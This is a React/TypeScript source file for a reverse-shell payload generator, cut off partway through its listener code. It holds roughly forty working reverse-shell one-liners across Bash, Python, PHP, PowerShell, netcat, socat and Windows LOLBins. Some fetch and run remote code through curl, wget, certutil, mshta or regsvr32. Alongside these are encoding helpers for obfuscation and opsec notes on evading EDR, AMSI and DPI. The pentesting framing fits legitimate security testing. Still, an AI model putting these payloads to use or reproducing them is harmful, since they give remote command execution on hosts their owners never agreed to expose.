"use client";

import React, { useState, useEffect, useCallback, useMemo } from "react";

// ─── Types ────────────────────────────────────────────────────────────────────
interface Shell {
  id: string;
  category: string;
  label: string;
  ext: string;
  generate: (ip: string, port: string) => string;
  explain: Record<string, string>;
  mitre?: string[];
  opsec?: string;
  noise?: "low" | "medium" | "high";
  encrypted?: boolean;
}

interface Theme {
  name: string;
  accent: string;
  dim: string;
  bg: string;
  panel: string;
  border: string;
  text: string;
  muted: string;
}

interface HistoryEntry {
  payload: string;
  shell: string;
  ts: number;
}

type ThemeKey = "green" | "amber" | "red" | "cyan";
type EncodingKey = "none" | "base64" | "url" | "double-url" | "hex";
type ListenerType =
  | "nc"
  | "ncat"
  | "socat"
  | "socat-pty"
  | "socat-tls"
  | "pwncat";
type TabKey = "payload" | "listener" | "tty" | "history";

// ─── Shell Definitions ────────────────────────────────────────────────────────
const SHELLS: Shell[] = [
  {
    id: "bash-tcp",
    category: "Bash",
    label: "Bash TCP",
    ext: "sh",
    generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    explain: {
      "bash -i": "Start interactive bash",
      ">& /dev/tcp/IP/PORT": "Redirect stdout+stderr to TCP socket",
      "0>&1": "Redirect stdin from same socket",
    },
    mitre: ["T1059.004"],
    opsec:
      "Very noisy — detected by most EDR/SIEM. Prefer encoded variants on monitored networks.",
    noise: "high",
  },
  {
    id: "bash-udp",
    category: "Bash",
    label: "Bash UDP",
    ext: "sh",
    generate: (ip, port) => `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
    explain: {
      "sh -i": "Start interactive sh",
      ">& /dev/udp/IP/PORT": "Redirect to UDP socket",
    },
    mitre: ["T1059.004"],
    opsec:
      "UDP often less monitored than TCP, but unreliable. Good for bypassing TCP-only firewalls.",
    noise: "medium",
  },
  {
    id: "bash-196",
    category: "Bash",
    label: "Bash fd 196",
    ext: "sh",
    generate: (ip, port) =>
      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
    explain: {
      "exec 196<>": "Open TCP socket as fd 196",
      "sh <&196 >&196 2>&196": "Bind shell I/O to fd 196",
    },
    mitre: ["T1059.004"],
    opsec:
      "Slightly less obvious in process listings than direct bash -i redirect.",
    noise: "medium",
  },
  {
    id: "bash-readline",
    category: "Bash",
    label: "Bash Read Line",
    ext: "sh",
    generate: (ip, port) =>
      `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
    explain: {
      "exec 5<>": "Open socket as fd 5",
      "while read line": "Read commands line by line",
      "$line 2>&5 >&5": "Execute and redirect output back",
    },
    mitre: ["T1059.004"],
    opsec:
      "Command-by-command execution leaves more log traces than persistent shell.",
    noise: "medium",
  },
  {
    id: "bash-loop",
    category: "Bash",
    label: "Bash Loop",
    ext: "sh",
    generate: (ip, port) =>
      `while true; do bash -i >& /dev/tcp/${ip}/${port} 0>&1; sleep 5; done`,
    explain: {
      "while true": "Persistent reconnect loop",
      "sleep 5": "Wait 5s before reconnecting",
    },
    mitre: ["T1059.004", "T1547"],
    opsec:
      "Persistent loop creates repeated connection attempts — highly visible in network logs.",
    noise: "high",
  },
  {
    id: "zsh",
    category: "Zsh",
    label: "Zsh TCP",
    ext: "sh",
    generate: (ip, port) =>
      `zsh -c 'zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
    explain: {
      "zmodload zsh/net/tcp": "Load zsh TCP module",
      ztcp: "Open TCP connection",
      ">&$REPLY": "Redirect to socket fd",
    },
    mitre: ["T1059.004"],
    opsec:
      "Zsh shells less common on servers — presence of zsh binary may itself be an anomaly indicator.",
    noise: "medium",
  },
  {
    id: "python3",
    category: "Python",
    label: "Python3",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
    explain: {
      "socket.socket(...)": "Create TCP socket",
      "s.connect(...)": "Connect to attacker",
      "os.dup2(...)": "Duplicate socket to stdin/stdout/stderr",
      "pty.spawn": "Spawn PTY shell for full interactivity",
    },
    mitre: ["T1059.006"],
    opsec:
      "Python process name visible in ps. pty.spawn gives full TTY — no upgrade needed.",
    noise: "medium",
  },
  {
    id: "python2",
    category: "Python",
    label: "Python2",
    ext: "py",
    generate: (ip, port) =>
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    explain: { "subprocess.call": "Execute shell process with duplicated fds" },
    mitre: ["T1059.006"],
    opsec:
      "Python2 EOL — its presence on modern systems may itself be a finding to report.",
    noise: "medium",
  },
  {
    id: "python3-ipv6",
    category: "Python",
    label: "Python3 IPv6",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("${ip}",${port},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
    explain: { AF_INET6: "Use IPv6 socket family" },
    mitre: ["T1059.006", "T1071"],
    opsec:
      "IPv6 traffic frequently uninspected by legacy security tools — useful bypass technique.",
    noise: "low",
  },
  {
    id: "python3-short",
    category: "Python",
    label: "Python3 Short",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
    explain: { "list comprehension": "Compact dup2 for all fds" },
    mitre: ["T1059.006"],
    opsec: "Compact form — harder to read in logs but same network signature.",
    noise: "medium",
  },
  {
    id: "php-exec",
    category: "PHP",
    label: "PHP exec",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    explain: {
      fsockopen: "Open TCP socket",
      exec: "Execute shell with socket fds",
    },
    mitre: ["T1059.004", "T1505.003"],
    opsec:
      "exec() often disabled in hardened php.ini. Check disable_functions before use.",
    noise: "high",
  },
  {
    id: "php-web",
    category: "PHP",
    label: "PHP Web Shell",
    ext: "php",
    generate: (ip, port) =>
      `<?php set_time_limit(0);$ip='${ip}';$port=${port};$sock=fsockopen($ip,$port);$proc=proc_open('/bin/sh -i', array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>`,
    explain: { "set_time_limit(0)": "Prevent PHP timeout" },
    mitre: ["T1505.003"],
    opsec:
      "Web shell upload is T1505.003. Document upload vector in report for full chain visibility.",
    noise: "high",
  },
  {
    id: "php-pentest-monkey",
    category: "PHP",
    label: "PHP PentestMonkey",
    ext: "php",
    generate: (ip, port) =>
      `<?php\nset_time_limit(0);\n$VERSION="1.0";\n$ip='${ip}';\n$port=${port};\n$chunk_size=1400;\n$write_a=null;\n$error_a=null;\n$shell='uname -a; w; id; /bin/sh -i';\n$daemon=0;\n$debug=0;\nif(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){exit(1);}if($pid){exit(0);}}\n$sock=fsockopen($ip,$port,$errno,$errstr,30);\nif(!$sock){exit(1);}\n$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));\n$process=proc_open($shell,$descriptorspec,$pipes);\nif(!is_resource($process)){exit(1);}\nfwrite($sock,"Connected!\\n");\nwhile(!feof($sock)){$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){$input=fread($sock,$chunk_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$chunk_size);fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$chunk_size);fwrite($sock,$input);}}\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n?>`,
    explain: {
      pcntl_fork: "Fork to background/daemonize",
      stream_select: "Multiplex socket and process I/O",
      proc_open: "Full bidirectional process I/O",
    },
    mitre: ["T1505.003"],
    opsec:
      "Classic PentestMonkey shell. Well-known signature — AV/WAF will likely detect.",
    noise: "high",
  },
  {
    id: "nc-traditional",
    category: "Netcat",
    label: "Netcat -e",
    ext: "sh",
    generate: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    explain: {
      "nc -e": "Execute program after connect (traditional netcat only)",
    },
    mitre: ["T1059.004", "T1021"],
    opsec:
      "Requires traditional netcat — OpenBSD variant (common on modern Linux) lacks -e flag.",
    noise: "high",
  },
  {
    id: "nc-openbsd",
    category: "Netcat",
    label: "Netcat OpenBSD",
    ext: "sh",
    generate: (ip, port) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    explain: {
      "mkfifo /tmp/f": "Create named pipe",
      "cat /tmp/f | sh": "Feed pipe to shell",
      "nc ... >/tmp/f": "Write nc output back to pipe",
    },
    mitre: ["T1059.004"],
    opsec:
      "Named pipe in /tmp leaves artifact on disk. Clean up /tmp/f after session.",
    noise: "medium",
  },
  {
    id: "nc-busybox",
    category: "Netcat",
    label: "BusyBox nc",
    ext: "sh",
    generate: (ip, port) => `busybox nc ${ip} ${port} -e sh`,
    explain: { "busybox nc": "BusyBox variant supports -e flag" },
    mitre: ["T1059.004"],
    opsec:
      "Ideal for embedded/IoT targets where BusyBox is the only toolkit available.",
    noise: "medium",
  },
  {
    id: "ps-tcp",
    category: "PowerShell",
    label: "PowerShell TCP",
    ext: "ps1",
    generate: (ip, port) =>
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    explain: {
      TCPClient: "Create .NET TCP client",
      "GetStream()": "Get network stream",
      "iex $data": "Execute received commands",
      "Out-String": "Capture output as string",
    },
    mitre: ["T1059.001"],
    opsec:
      "-nop bypasses profile execution policy. AMSI and PowerShell ScriptBlock logging will capture this in Event ID 4104.",
    noise: "high",
  },
  {
    id: "ps-b64",
    category: "PowerShell",
    label: "PowerShell Base64",
    ext: "ps1",
    generate: (ip, port) => {
      const raw = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      const b64 = btoa(unescape(encodeURIComponent(raw)));
      return `powershell -EncodedCommand ${b64}`;
    },
    explain: {
      "-EncodedCommand":
        "Accept base64 UTF-16LE encoded command, bypasses some detection",
    },
    mitre: ["T1059.001", "T1027"],
    opsec:
      "EncodedCommand obfuscates from casual inspection but AMSI still decodes and scans before execution.",
    noise: "medium",
  },
  {
    id: "ps-tls",
    category: "PowerShell",
    label: "PowerShell TLS",
    ext: "ps1",
    generate: (ip, port) =>
      `$sslStream = [System.Net.Security.SslStream]::new([System.Net.Sockets.TcpClient]::new('${ip}',${port}).GetStream());$sslStream.AuthenticateAsClient('${ip}');$writer=[System.IO.StreamWriter]::new($sslStream);$reader=[System.IO.StreamReader]::new($sslStream);while($true){$writer.Write('PS> ');$writer.Flush();$cmd=$reader.ReadLine();if($cmd -eq 'exit'){break};$result=iex $cmd 2>&1|Out-String;$writer.WriteLine($result);$writer.Flush()}`,
    explain: {
      SslStream: "Encrypted shell over TLS",
      AuthenticateAsClient: "TLS handshake",
    },
    mitre: ["T1059.001", "T1573.001"],
    opsec:
      "TLS encryption prevents DPI inspection. Operator must have matching cert/listener. Best for sensitive engagements.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "socat-basic",
    category: "Socat",
    label: "Socat Basic",
    ext: "sh",
    generate: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh`,
    explain: {
      socat: "Multipurpose relay tool",
      "TCP:IP:PORT": "Connect to attacker",
      "EXEC:/bin/sh": "Execute shell",
    },
    mitre: ["T1059.004"],
    opsec:
      "Socat binary may not be present — check availability. Transfer static binary if needed.",
    noise: "medium",
  },
  {
    id: "socat-pty",
    category: "Socat",
    label: "Socat PTY",
    ext: "sh",
    generate: (ip, port) =>
      `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    explain: {
      pty: "Allocate pseudo-terminal",
      setsid: "New session",
      sane: "Set sane terminal settings",
      sigint: "Pass SIGINT through",
    },
    mitre: ["T1059.004"],
    opsec:
      "Full PTY — no upgrade needed. Best choice when socat is available. Fully interactive.",
    noise: "medium",
  },
  {
    id: "socat-tls",
    category: "Socat",
    label: "Socat TLS",
    ext: "sh",
    generate: (ip, port) => `socat OPENSSL:${ip}:${port},verify=0 EXEC:/bin/sh`,
    explain: {
      "OPENSSL:": "Use TLS transport",
      "verify=0": "Skip certificate verification",
    },
    mitre: ["T1059.004", "T1573.001"],
    opsec:
      "Encrypted channel defeats network-level inspection. verify=0 is fine for pentests.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "openssl",
    category: "OpenSSL",
    label: "OpenSSL",
    ext: "sh",
    generate: (ip, port) =>
      `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`,
    explain: {
      "mkfifo /tmp/s": "Named pipe for I/O loop",
      "openssl s_client": "TLS encrypted channel",
      "-quiet": "Suppress handshake output",
    },
    mitre: ["T1059.004", "T1573.001"],
    opsec:
      "openssl is almost always present. TLS encrypted — excellent for evading DPI. Named pipe cleaned up at end.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "ruby-fork",
    category: "Ruby",
    label: "Ruby Fork",
    ext: "rb",
    generate: (ip, port) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    explain: {
      "exit if fork": "Daemonize by forking",
      "IO.popen": "Execute command and capture output",
    },
    mitre: ["T1059.004"],
    opsec:
      "Fork daemonizes process — parent exits cleanly. Useful for backgrounding.",
    noise: "medium",
  },
  {
    id: "perl-sh",
    category: "Perl",
    label: "Perl /bin/sh",
    ext: "pl",
    generate: (ip, port) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    explain: {
      "use Socket": "Load socket module",
      sockaddr_in: "Build sockaddr struct",
      'open(STDIN,">&S")': "Redirect STDIN to socket",
    },
    mitre: ["T1059.006"],
    opsec:
      "Perl widely available on legacy Unix systems. Stable alternative when bash/python unavailable.",
    noise: "medium",
  },
  {
    id: "golang",
    category: "Go",
    label: "Golang",
    ext: "go",
    generate: (ip, port) =>
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
    explain: {
      "net.Dial": "TCP connect",
      "cmd.Stdin/Stdout/Stderr=c": "Bind shell I/O to connection",
    },
    mitre: ["T1059.004"],
    opsec:
      "Requires Go compiler on target. Better to compile cross-platform binary off-target and transfer.",
    noise: "medium",
  },
  {
    id: "nodejs",
    category: "Node.js",
    label: "Node.js",
    ext: "js",
    generate: (ip, port) =>
      `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
    explain: {
      'require("net")': "Load net module",
      'cp.spawn("/bin/sh")': "Spawn shell process",
      ".pipe()": "Connect socket streams to shell",
    },
    mitre: ["T1059.007"],
    opsec:
      "Node.js process visible with full command args in ps. Self-invoking function adds minor obfuscation.",
    noise: "medium",
  },
  {
    id: "awk",
    category: "Awk",
    label: "Awk",
    ext: "sh",
    generate: (ip, port) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print $0 |& s; close(c)} while(c != "exit") }}'`,
    explain: {
      "/inet/tcp/0/IP/PORT": "Awk TCP socket syntax",
      "|&": "Awk coprocess pipe",
    },
    mitre: ["T1059.004"],
    opsec:
      "Awk is a LOLBin — built-in on almost all Unix systems. Useful when other interpreters are blocked.",
    noise: "low",
  },
  {
    id: "lua",
    category: "Lua",
    label: "Lua",
    ext: "lua",
    generate: (ip, port) =>
      `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    explain: {
      "require('socket')": "Load LuaSocket library",
      "t:connect": "TCP connect",
    },
    mitre: ["T1059.004"],
    opsec:
      "Requires LuaSocket library. Common on embedded targets and game servers running Lua.",
    noise: "medium",
  },
  {
    id: "telnet",
    category: "Telnet",
    label: "Telnet",
    ext: "sh",
    generate: (ip, port) =>
      `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | /bin/sh 1>$TF`,
    explain: {
      "mktemp -u": "Generate temp filename (no create)",
      mkfifo: "Create named pipe",
      "telnet ... | /bin/sh": "Pipe telnet to shell",
    },
    mitre: ["T1059.004"],
    opsec:
      "Telnet traffic unencrypted — all commands visible on wire. Named pipe cleaned up at session end.",
    noise: "high",
  },
  {
    id: "curl-bash",
    category: "Download",
    label: "Curl Pipe Bash",
    ext: "sh",
    generate: (ip, port) => `curl http://${ip}:${port}/shell.sh | bash`,
    explain: {
      "curl ... | bash": "Download and execute remotely hosted shell script",
    },
    mitre: ["T1059.004", "T1105"],
    opsec:
      "T1105 file transfer chain. HTTP download visible in proxy/network logs. Use HTTPS and randomize path.",
    noise: "high",
  },
  {
    id: "wget-bash",
    category: "Download",
    label: "Wget Pipe Bash",
    ext: "sh",
    generate: (ip, port) => `wget -O- http://${ip}:${port}/shell.sh | bash`,
    explain: { "wget -O-": "Write to stdout for piping" },
    mitre: ["T1059.004", "T1105"],
    opsec:
      "Same chain as curl variant. wget user-agent is distinct and easily fingerprintable.",
    noise: "high",
  },
  {
    id: "java",
    category: "Java",
    label: "Java Runtime",
    ext: "java",
    generate: (ip, port) =>
      `r = Runtime.getRuntime();\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);\np.waitFor();`,
    explain: {
      "Runtime.getRuntime()": "Get JVM runtime",
      "r.exec([...])": "Execute command array",
      "waitFor()": "Block until process exits",
    },
    mitre: ["T1059.004"],
    opsec:
      "Useful in Groovy script consoles (Jenkins, etc). Runs inside JVM process — may bypass host-based firewalls.",
    noise: "medium",
  },
  {
    id: "groovy",
    category: "JVM",
    label: "Groovy",
    ext: "groovy",
    generate: (ip, port) =>
      `String host="${ip}";int port=${port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(p.exitValue()>=0)break;}p.destroy();s.close();`,
    explain: {
      ProcessBuilder: "Spawn process",
      redirectErrorStream: "Merge stderr to stdout",
    },
    mitre: ["T1059.004"],
    opsec:
      "Classic Jenkins Script Console exploitation. Document the RCE vector, not just shell access.",
    noise: "medium",
  },
  {
    id: "ncat-tls",
    category: "Netcat",
    label: "Ncat TLS",
    ext: "sh",
    generate: (ip, port) => `ncat --ssl ${ip} ${port} -e /bin/bash`,
    explain: {
      "--ssl": "Encrypt channel with TLS",
      "-e /bin/bash": "Execute bash after connect",
    },
    mitre: ["T1059.004", "T1573.001"],
    opsec:
      "Ncat (Nmap suite) supports TLS natively. Encrypted channel — preferable to plaintext nc.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "cmd-tcp",
    category: "Windows",
    label: "CMD TCP",
    ext: "bat",
    generate: (ip, port) =>
      `cmd.exe /c "powershell -nop -w hidden -c \\"$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(cmd /c $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\""`,
    explain: {
      "cmd.exe /c": "Run command via cmd",
      "Net.Sockets.TCPClient": ".NET TCP socket",
      "cmd /c $d": "Execute each received command via cmd",
    },
    mitre: ["T1059.003", "T1059.001"],
    opsec:
      "cmd.exe spawned by powershell creates suspicious parent-child process relationship — visible in Sysmon Event ID 1.",
    noise: "high",
  },
  {
    id: "certutil-dl",
    category: "Windows",
    label: "Certutil Download",
    ext: "bat",
    generate: (ip, port) =>
      `certutil.exe -urlcache -split -f http://${ip}:${port}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe`,
    explain: {
      "certutil -urlcache": "Built-in Windows download utility",
      "-split -f": "Force download to file",
      "%TEMP%\\shell.exe": "Write to temp dir and execute",
    },
    mitre: ["T1105", "T1218.001"],
    opsec:
      "certutil.exe network activity is a well-known LOLBin abuse (T1218). Monitored by Defender and most EDR.",
    noise: "high",
  },
  {
    id: "mshta",
    category: "Windows",
    label: "Mshta",
    ext: "bat",
    generate: (ip, port) =>
      `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -c """"$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"""",0,True")(window.close)")`,
    explain: {
      mshta: "Microsoft HTML Application host — runs VBScript",
      "Wscript.Shell.Run": "Execute command silently",
    },
    mitre: ["T1218.005"],
    opsec:
      "mshta.exe is a signed LOLBin — may bypass application whitelist. Heavily flagged by modern EDR.",
    noise: "high",
  },
  {
    id: "regsvr32",
    category: "Windows",
    label: "Regsvr32 SCT",
    ext: "bat",
    generate: (ip, port) =>
      `regsvr32 /s /n /u /i:http://${ip}:${port}/shell.sct scrobj.dll`,
    explain: {
      "regsvr32 /i:URL": "Load scriptlet from URL — bypasses applocker",
      "scrobj.dll": "Script Component Runtime — executes .sct files",
    },
    mitre: ["T1218.010"],
    opsec:
      "Squiblydoo technique (T1218.010). Well-known and detectable. Demonstrate for AppLocker bypass finding.",
    noise: "high",
  },
  {
    id: "r",
    category: "R",
    label: "R Language",
    ext: "r",
    generate: (ip, port) =>
      `r <- rawConnection(raw(0), "r+");zz <- socketConnection(host="${ip}", port=${port}, blocking=TRUE, server=FALSE, open="r+");system("/bin/sh -i",input=readLines(zz), wait=FALSE)`,
    explain: {
      socketConnection: "R TCP socket",
      "system(... input=readLines)": "Execute shell with socket as stdin",
    },
    mitre: ["T1059.004"],
    opsec:
      "R present on data science/ML servers. Unexpected R network activity is a strong anomaly indicator.",
    noise: "low",
  },
  {
    id: "kotlin",
    category: "Kotlin",
    label: "Kotlin",
    ext: "kt",
    generate: (ip, port) =>
      `import java.io.*;import java.net.*;val s=Socket("${ip}",${port});val p=Runtime.getRuntime().exec("/bin/sh");val pi=p.inputStream;val pe=p.errorStream;val si=s.getInputStream();val so=s.getOutputStream();Thread{pi.copyTo(so)}.start();Thread{pe.copyTo(so)}.start();si.copyTo(p.outputStream)`,
    explain: {
      "Socket(ip,port)": "Open TCP connection",
      "Runtime.exec": "Spawn shell process",
      copyTo: "Stream pipe between socket and process",
    },
    mitre: ["T1059.004"],
    opsec:
      "Kotlin runs on JVM — useful in Android pentesting contexts or Kotlin-based application servers.",
    noise: "medium",
  },
  {
    id: "haskell",
    category: "Haskell",
    label: "Haskell",
    ext: "hs",
    generate: (ip, port) =>
      `module Main where;import Network.Socket;import System.Process;import System.IO;main::IO();main=do{s<-socket AF_INET Stream 0;addr<-inet_addr "${ip}";connect s (SockAddrInet ${port} addr);h<-socketToHandle s ReadWriteMode;hSetBuffering h NoBuffering;(_,_,_,ph)<-createProcess(proc "/bin/sh"[]){std_in=UseHandle h,std_out=UseHandle h,std_err=UseHandle h};waitForProcess ph;return()}`,
    explain: {
      "Network.Socket": "Haskell socket library",
      socketToHandle: "Convert socket to I/O handle",
      createProcess: "Spawn shell with socket handles",
    },
    mitre: ["T1059.004"],
    opsec:
      "Haskell rare on servers — its presence may itself be an indicator. Compile off-target and transfer binary.",
    noise: "low",
  },
  {
    id: "tcl",
    category: "Tcl",
    label: "Tcl",
    ext: "tcl",
    generate: (ip, port) =>
      `set s [socket ${ip} ${port}];fconfigure $s -translation binary -buffering full;set p [open "|/bin/sh -i" r+];fconfigure $p -translation binary -buffering full;fileevent $s readable {puts -nonewline $p [read $s]};fileevent $p readable {puts -nonewline $s [read $p]};vwait forever`,
    explain: {
      "socket ip port": "Open TCP socket",
      'open "|/bin/sh -i"': "Open shell as pipe",
      fileevent: "Event-driven I/O wiring",
    },
    mitre: ["T1059.004"],
    opsec:
      "Tcl common in network equipment (Cisco, F5). Pivoting via network device shells is high-impact finding.",
    noise: "low",
  },
];

const COMMON_PORTS: number[] = [4444, 1337, 9001, 443, 80, 8080, 31337, 6666];

const THEMES: Record<ThemeKey, Theme> = {
  green: {
    name: "Green",
    accent: "#00ff41",
    dim: "#00aa28",
    bg: "#0a0f0a",
    panel: "#0d140d",
    border: "#1a2e1a",
    text: "#c8ffc8",
    muted: "#4a7a4a",
  },
  amber: {
    name: "Amber",
    accent: "#ffb300",
    dim: "#cc8800",
    bg: "#0f0e0a",
    panel: "#14120d",
    border: "#2e2a1a",
    text: "#fff3c8",
    muted: "#7a6a4a",
  },
  red: {
    name: "Red",
    accent: "#ff3131",
    dim: "#cc0000",
    bg: "#0f0a0a",
    panel: "#140d0d",
    border: "#2e1a1a",
    text: "#ffc8c8",
    muted: "#7a4a4a",
  },
  cyan: {
    name: "Cyan",
    accent: "#00eeff",
    dim: "#00aabb",
    bg: "#0a0f0f",
    panel: "#0d1414",
    border: "#1a2e2e",
    text: "#c8ffff",
    muted: "#4a7a7a",
  },
};

// TTY Upgrade Steps
const TTY_STEPS = [
  {
    id: "spawn",
    title: "1. Spawn PTY",
    description: "Run one of these on the target to get a proper PTY:",
    commands: [
      {
        label: "Python3 (most common)",
        cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        preferred: true,
      },
      {
        label: "Python2",
        cmd: "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
      },
      { label: "Script", cmd: "script /dev/null -c bash" },
      { label: "Perl", cmd: "perl -e 'exec \"/bin/bash\";'" },
      { label: "Ruby", cmd: "ruby -e 'exec \"/bin/bash\"'" },
    ],
  },
  {
    id: "background",
    title: "2. Background the shell",
    description:
      "Press Ctrl+Z to background the remote shell. You'll return to your local terminal.",
    commands: [
      { label: "Background shell", cmd: "^Z  (Ctrl+Z)", preferred: true },
    ],
  },
  {
    id: "local",
    title: "3. Fix your local terminal",
    description: "Configure your local terminal to pass through raw input:",
    commands: [
      {
        label: "Set raw mode + echo off",
        cmd: "stty raw -echo; fg",
        preferred: true,
      },
    ],
  },
  {
    id: "term",
    title: "4. Set terminal environment",
    description:
      "After pressing Enter twice to resume, fix terminal variables on the target:",
    commands: [
      { label: "Set TERM", cmd: "export TERM=xterm-256color", preferred: true },
      {
        label: "Get local stty size first",
        cmd: "stty size  # run in your LOCAL terminal first",
      },
      { label: "Set rows/cols", cmd: "stty rows 50 cols 220" },
      { label: "Source shell config", cmd: "export SHELL=bash; reset" },
    ],
  },
];

function encodePayload(payload: string, method: EncodingKey): string {
  switch (method) {
    case "base64":
      return btoa(payload);
    case "url":
      return encodeURIComponent(payload);
    case "double-url":
      return encodeURIComponent(encodeURIComponent(payload));
    case "hex":
      return Array.from(payload)
        .map((c) => c.charCodeAt(0).toString(16).padStart(2, "0"))
        .join("");
    default:
      return payload;
  }
}

function getListener(port: string, type: ListenerType): string {
  switch (type) {
    case "nc":
      return `nc -lvnp ${port}`;
    case "ncat":
      return `ncat -lvp ${port}`;
    case "socat":
      return `socat -d -d TCP-LISTEN:${port},reuseaddr,fork STDOUT`;
    case "socat-pty":
